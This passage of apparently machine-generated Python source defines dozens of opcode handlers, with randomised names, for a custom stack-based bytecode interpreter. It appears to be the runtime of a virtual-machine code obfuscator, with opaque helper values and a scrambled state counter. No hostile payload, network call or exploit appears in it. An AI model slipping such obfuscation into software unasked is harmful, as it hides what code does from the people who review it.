 right = stack.pop(); left = stack.pop(); stack.append(left not in right)
def _xl482(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 name_idx, argc = arg; name = names[name_idx]
 if name == 'super' and argc == 0:
  if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
   stack.append(_builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0]))
  else:
   stack.append(_builtins.super())
 else:
  func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
  args = stack[-argc:] if argc > 0 else []
  if argc > 0:
   del stack[-argc:]
  if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
   args = [func.__self__] + list(args); func = func.__func__
  if isinstance(func, _uuy41ibljh):
   _fl = _azytjxepq8(func.code, args, {}, func.defaults, func.kw_defaults)
   frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
  else:
   stack.append(func(*args))
def _xm28c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 while len(fastlocals) <= arg:
  fastlocals.append(None)
 fastlocals[arg] = stack[-1]
def _xma88(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(stack[-1]); _n = names[6]
 _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _b_2_1 = _b_1_0; _b_2_0 = stack.pop()
 _b_2_res = isinstance(_b_2_0, _b_2_1) or (isinstance(_b_2_0, type) and issubclass(_b_2_0, _b_2_1))
 stack.append(_b_2_res)
def _xz783(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_1 = stack.pop(); _t0_0 = stack.pop(); _t0_res = _t0_0 != _t0_1
 _t1_0 = _t0_res; _t1_res = not _t1_0; stack.append(_t1_res)
def _xk8d1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(fastlocals[arg])
def _xad24(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if stack.pop():
  frame._z5a0l725 = arg
def _xxf46(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = stack.pop()
 while len(fastlocals) <= arg[0]:
  fastlocals.append(None)
 fastlocals[arg[0]] = _t0_0; _t1_0 = stack.pop()
 while len(fastlocals) <= arg[1]:
  fastlocals.append(None)
 fastlocals[arg[1]] = _t1_0
def _xh39d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
 if cmp_arg == 0:
  res = left < right
 elif cmp_arg == 1:
  res = left <= right
 elif cmp_arg == 2:
  res = left == right
 elif cmp_arg == 3:
  res = left != right
 elif cmp_arg == 4:
  res = left > right
 elif cmp_arg == 5:
  res = left >= right
 elif cmp_arg == 6:
  res = left in right
 elif cmp_arg == 7:
  res = left not in right
 elif cmp_arg == 8:
  res = left is right
 elif cmp_arg == 9:
  res = left is not right
 elif cmp_arg == 10:
  res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 if not res:
  frame._z5a0l725 = target_pc
def _xl6af(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(fastlocals[arg[0]] + fastlocals[arg[1]])
def _xe6fb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if stack[-1]:
  frame._z5a0l725 = arg
def _xi9da(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left > right)
def _xd372(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = consts[arg[0]]; _t1_0 = consts[arg[1]]; stack.append(_t0_0)
 stack.append(_t1_0)
def _xd27b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _xr1yxr2dh = names[arg]; _wlurtp0l = globals_dict
 if _xr1yxr2dh in _wlurtp0l:
  _wjjeget1g = _wlurtp0l[_xr1yxr2dh]; stack.append(_wjjeget1g)
 elif _xr1yxr2dh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _xr1yxr2dh in builtins_dict:
  stack.append(builtins_dict[_xr1yxr2dh])
 else:
  raise NameError(f"name '{_xr1yxr2dh}' is not defined")
def _xsf05(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _roaztkszp7 = stack.pop(); frame._ixo9t7e8g = _roaztkszp7; return _RET_SIGNAL
def _dre60(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xbcac(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left / right)
def _xbec1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_0 = consts[arg[0]]; _d1_0 = consts[arg[1]]; _d2_0 = consts[arg[2]]
 stack.append(_d0_0); stack.append(_d1_0); stack.append(_d2_0)
def _xq839(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _noxko8g8qy = stack.pop(); _lpdpoc50 = stack.pop()
 stack.append(_lpdpoc50 ** _noxko8g8qy)
def _xw608(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left == right)
def _xe471(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(stack[-1]); _n = names[9]
 _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _b_2_1 = _b_1_0; _b_2_0 = stack.pop()
 _b_2_res = isinstance(_b_2_0, _b_2_1) or (isinstance(_b_2_0, type) and issubclass(_b_2_0, _b_2_1))
 stack.append(_b_2_res)
def _xg282(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left is not right)
def _xhedd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-2] = stack[-2] + stack[-1]; stack.pop()
def _xs763(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _gr09skdgig = stack.pop(); globals_dict[names[arg]] = _gr09skdgig
def _xzec9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if arg == 0:
  stack.append([])
 else:
  items = stack[-arg:]; del stack[-arg:]; stack.append(items)
def _xn793(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 try:
  stack.append(next(stack[-1]))
 except StopIteration:
  stack.pop(); frame._z5a0l725 = arg
def _xccb5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-1] = not stack[-1]
def _xu3bc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop(); locals_dict[names[4]] = _b_0_0; _b_1_0 = consts[3]
 stack.append(_b_1_0)
def _xyd6a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(tuple(stack.pop()))
def _xc1bb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _au6n7hv3i = stack.pop(); locals_dict[names[arg]] = _au6n7hv3i
def _dbb6f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xl802(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left @ right)
def _xz891(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_obj = stack.pop(); _d0_0 = getattr(_d0_obj, names[16])
 _d1_0 = consts[arg[0]]; _d2_0 = consts[arg[1]]; stack.append(_d0_0)
 stack.append(_d1_0); stack.append(_d2_0)
def _xo4ff(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_obj = stack.pop(); _b_0_0 = getattr(_b_0_obj, names[0])
 _b_1_0 = fastlocals[0]; stack.append(_b_0_0); stack.append(_b_1_0)
def _xxf03(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left is right)
def _xdbd3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _n = names[0]
 _b_0_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
 _b_1_0 = _b_0_0; locals_dict[names[1]] = _b_1_0; _b_2_0 = consts[0]
 _b_3_0 = _b_2_0; locals_dict[names[2]] = _b_3_0; _b_4_0 = consts[1]
 stack.append(_b_4_0)
def _xs7c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 del stack[-1]
def _xbde1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-1] = -stack[-1]
def _xrcaa(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop(); locals_dict[names[5]] = _b_0_0; _b_1_0 = consts[4]
 stack.append(_b_1_0)
def _xg40b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_0 = stack.pop(); _n = names[7]
 _d1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _d2_obj = _d1_0; _d2_0 = getattr(_d2_obj, names[8]); _d3_0 = consts[2]
 _d4_0 = consts[arg]; stack.append(_d2_0); stack.append(_d3_0)
 stack.append(_d4_0)
def _xl39a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _ahafeyuh = names[arg]; _w1gv0e38d = locals_dict
 if _ahafeyuh in _w1gv0e38d:
  stack.append(_w1gv0e38d[_ahafeyuh])
 elif _ahafeyuh in globals_dict:
  stack.append(globals_dict[_ahafeyuh])
 elif _ahafeyuh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _ahafeyuh in builtins_dict:
  stack.append(builtins_dict[_ahafeyuh])
 else:
  raise NameError(f"name '{_ahafeyuh}' is not defined")
def _xj762(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__')
 exit_fn = getattr(ctx_mgr, '__exit__'); res = enter_fn()
 frame._el6246hi.append(_mt3w5uzb(_kdd4v30t.WITH, arg, len(stack), exit_fn=exit_fn))
 stack.append(res)
def _xide9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _n = names[3]
 _b_1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
 stack.append(_b_1_0)
def _xd5b2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _n = names[13]
 _b_0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _b_1_0 = consts[44]; stack.append(_b_0_0); stack.append(_b_1_0)
def _xha6a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(fastlocals[arg[0]] + consts[arg[1]])
def _xu293(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if arg == 0:
  raise
 elif arg == 1:
  raise stack.pop()
 elif arg == 2:
  cause = stack.pop(); exc = stack.pop(); raise exc from cause
def _xa2ca(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _x8j3trp0j4 = fastlocals[arg]; stack.append(_x8j3trp0j4)
def _xx66d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = fastlocals[arg]; _t1_0 = _t0_0; _t1_res = not _t1_0
 stack.append(_t1_res)
def _xvb5e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_obj = stack.pop(); _d0_0 = getattr(_d0_obj, names[arg[0]])
 _d1_0 = consts[arg[1]]; stack.append(_d0_0); stack.append(_d1_0)
def _xk572(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._z5a0l725 = arg
def _xb771(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = fastlocals[arg[0]]; _t1_0 = consts[arg[1]]; stack.append(_t0_0)
 stack.append(_t1_0)
def _xh492(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 args = stack[-arg:] if arg > 0 else []
 if arg > 0:
  del stack[-arg:]
 func = stack.pop()
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  args = [func.__self__] + list(args); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, args, {}, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*args))
def _xla3c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop(); locals_dict[names[2]] = _b_0_0; _b_1_0 = consts[6]
 stack.append(_b_1_0)
def _xr82d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._ixo9t7e8g = consts[arg]; return _RET_SIGNAL
def _xt16c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _g2m5zja8d = stack.pop()
 if arg >= len(fastlocals):
  fastlocals.extend([None] * (arg - len(fastlocals) + 1))
 fastlocals[arg] = _g2m5zja8d
def _xr264(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.pop()
def _xm242(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _r3bnvbc2vy = arg; frame._z5a0l725 = _r3bnvbc2vy
def _xk76b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left >= right)
def _xf91f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left | right)
def _xgfdc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d3rzsj49it = stack.pop(); _m7s55j2o = stack.pop(); _zja04ux5qr = stack.pop()
 _m7s55j2o[_d3rzsj49it] = _zja04ux5qr
def _xoed2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop(); locals_dict[names[1]] = _b_0_0; _b_1_0 = stack.pop()
def _xi841(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].update(val)
def _xdb8b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _rpv60vaiy = names[arg]; _s89yjb1qx6 = stack.pop(); _fp38qoldfo = stack.pop()
 setattr(_s89yjb1qx6, _rpv60vaiy, _fp38qoldfo)
def _xu671(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
 import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
 stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
def _xuae5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left << right)
def _xz38d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(consts[arg])
def _xna8a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _sqpgb7r3o = names[arg]
 if _sqpgb7r3o in globals_dict:
  del globals_dict[_sqpgb7r3o]
 else:
  raise NameError(f"name '{_sqpgb7r3o}' is not defined")
def _xh1ed(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 const_idx, var_idx = arg
 while len(fastlocals) <= var_idx:
  fastlocals.append(None)
 fastlocals[var_idx] = consts[const_idx]
def _xh11d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 kwargs = stack.pop() if arg & 1 else {}; args = stack.pop(); func = stack.pop()
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  args = tuple([func.__self__] + list(args)); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, args, kwargs, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*args, **kwargs))
def _xqd30(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].extend(val)
def _xn6ab(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 mod = stack.pop()
 if hasattr(mod, '__all__'):
  for k in mod.__all__:
   locals_dict[k] = getattr(mod, k)
 else:
  for k, v in mod.__dict__.items():
   if not k.startswith('_'):
    locals_dict[k] = v
def _xwb65(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if not stack.pop():
  frame._z5a0l725 = arg
def _xabe2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _hm6cfnfho = stack[-1]; stack[-1] = stack[-2]; stack[-2] = stack[-3]
 stack[-3] = _hm6cfnfho
def _xe53c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); cmp_arg = arg
 if arg == 0:
  stack.append(not left >= right)
 elif arg == 1:
  stack.append(not left > right)
 elif arg == 2:
  stack.append(not left != right)
 elif arg == 3:
  stack.append(not left == right)
 elif arg == 4:
  stack.append(not left <= right)
 elif arg == 5:
  stack.append(not left < right)
 elif arg == 6:
  stack.append(left in right)
 elif arg == 7:
  stack.append(not left in right)
 elif arg == 8:
  stack.append(left is right)
 elif arg == 9:
  stack.append(not left is right)
 elif arg == 10:
  stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xqfb2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].append(val)
def _xvb74(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if frame._d25owf759 is not None:
  frame._d25owf759(None, None, None); frame._d25owf759 = None
def _xzbe3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = consts[arg]; _t1_0 = _t0_0; _t1_res = -_t1_0; stack.append(_t1_res)
def _xe927(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop()
 stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xz5eb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left + right)
def _xx2d5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(getattr(stack[-1], names[arg]))
def _xu857(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); cmp_arg = arg
 if arg == 0:
  stack.append(left < right)
 elif arg == 1:
  stack.append(left <= right)
 elif arg == 2:
  stack.append(left == right)
 elif arg == 3:
  stack.append(left != right)
 elif arg == 4:
  stack.append(left > right)
 elif arg == 5:
  stack.append(left >= right)
 elif arg == 6:
  stack.append(left in right)
 elif arg == 7:
  stack.append(left not in right)
 elif arg == 8:
  stack.append(left is right)
 elif arg == 9:
  stack.append(left is not right)
 elif arg == 10:
  stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xuc02(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-2] = stack[-2] - stack[-1]; stack.pop()
def _xxc09(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if arg == 2:
  upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
 elif arg == 3:
  step = stack.pop(); upper = stack.pop(); lower = stack.pop()
  stack.append(slice(lower, upper, step))
def _xgc45(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 locals_dict[names[arg]] = stack.pop()
def _xk156(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = fastlocals[0]; _b_1_obj = _b_0_0; _b_1_val = stack.pop()
 setattr(_b_1_obj, names[6], _b_1_val)
def _xdfc1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._z5a0l725 = arg
def _xb17a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _aqvkizzqy = names[arg]; _iv2heifjfc = stack.pop()
 stack.append(getattr(_iv2heifjfc, _aqvkizzqy))
def _xue58(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _ahafeyuh = names[arg]
 if _ahafeyuh in locals_dict:
  stack.append(locals_dict[_ahafeyuh])
 elif _ahafeyuh in globals_dict:
  stack.append(globals_dict[_ahafeyuh])
 elif _ahafeyuh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _ahafeyuh in builtins_dict:
  stack.append(builtins_dict[_ahafeyuh])
 else:
  raise NameError(f"name '{_ahafeyuh}' is not defined")
def _xs242(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-1] = +stack[-1]
def _xt7c5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if not stack[-1]:
  frame._z5a0l725 = arg
def _xgf9c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._ixo9t7e8g = stack.pop(); return _RET_SIGNAL
def _xlaa8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if not stack[-1]:
  frame._z5a0l725 = arg
 else:
  stack.pop()
def _xp754(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _pxo1bdje1 = names[arg]; _qxtogn1w = stack.pop()
 delattr(_qxtogn1w, _pxo1bdje1)
def _xaa95(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _rmoge4qxxv = stack.pop(); _a2ieuc1h = stack.pop()
 stack.append(_a2ieuc1h * _rmoge4qxxv)
def _xk222(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = stack.pop(); locals_dict[names[3]] = _b_0_0; _b_1_0 = consts[2]
 stack.append(_b_1_0)
def _xx9fb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _b_0_0 = fastlocals[1]; _b_1_1 = _b_0_0; _b_1_0 = stack.pop()
 frame._jlookep7y6 = (frame._jlookep7y6 * 1103515245 + 12345 ^ (_b_1_0 if type(_b_1_0) is int else 0)) & 4294967295
 _b_1_res = (_b_1_0 ^ _b_1_1) + 2 * (_b_1_0 & _b_1_1) if type(_b_1_0) is int and type(_b_1_1) is int else _b_1_0 + _b_1_1
 stack.append(_b_1_res)
def _xp274(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _k1n759in4o = stack.pop(); _kr6n92xf8e = stack.pop()
 del _kr6n92xf8e[_k1n759in4o]
def _xlf0f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack[-1] = ~stack[-1]
def _xx566(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_0 = consts[arg[0]]; _d1_0 = consts[arg[1]]; stack.append(_d0_0)
 stack.append(_d1_0)
def _xc47f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 fastlocals[arg] = None
def _xn387(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left < right)
def _xrd40(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left ^ right)
def _xv630(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(fastlocals[arg[0]] * fastlocals[arg[1]])
def _xv4a5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(fastlocals[arg[0]] * consts[arg[1]])
def _xu38f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left % right)
def _xe7c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._ia1wj0tp[arg].val = stack.pop()
def _xoa6d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(fastlocals[arg[0]] - consts[arg[1]])
def _xcabf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _cdyk0x65m = stack.pop(); _sfm8zov7ln = stack.pop()
 stack.append(_sfm8zov7ln >> _cdyk0x65m)
def _xi971(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 pass
def _xvb65(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 if arg == 0:
  stack.append(())
 else:
  items = tuple(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xcc53(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 stack.append(frame._ia1wj0tp[arg].val)
def _xvf28(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _d0_0 = stack.pop(); _n = names[4]
 _d1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 _d2_obj = _d1_0; _d2_0 = getattr(_d2_obj, names[arg]); stack.append(_d2_0)
def _xc728(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 right = stack.pop(); left = stack.pop(); stack.append(left >> right)
def _xle8f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _t0_0 = fastlocals[arg[0]]; _t1_0 = fastlocals[arg[1]]; stack.append(_t0_0)
 stack.append(_t1_0)
def _xr5b0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _loonncil = stack.pop(); _dx2ek3zezq = stack.pop()
 stack.append(_dx2ek3zezq ^ _loonncil)
def _xpe0e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _enf313fpoy = stack.pop(); _hv12ii826 = stack.pop()
 stack.append(_hv12ii826 & _enf313fpoy)
def _xibb4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _ufcpkjcsl = stack.pop(); _oc3c54ws = stack.pop()
 stack.append(_oc3c54ws << _ufcpkjcsl)
def _xy395(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 val = stack.pop(); key = stack.pop()
 depth = arg if arg is not None and arg > 0 else 1; stack[-depth][key] = val
def _xr31d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 frame._el6246hi.append(_mt3w5uzb(_kdd4v30t.FINALLY, arg, len(stack)))
def _xh915(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 while len(fastlocals) <= arg:
  fastlocals.append(None)
 fastlocals[arg] = stack.pop()
def _xi20f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
 _n = names[13]
 _b_0_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
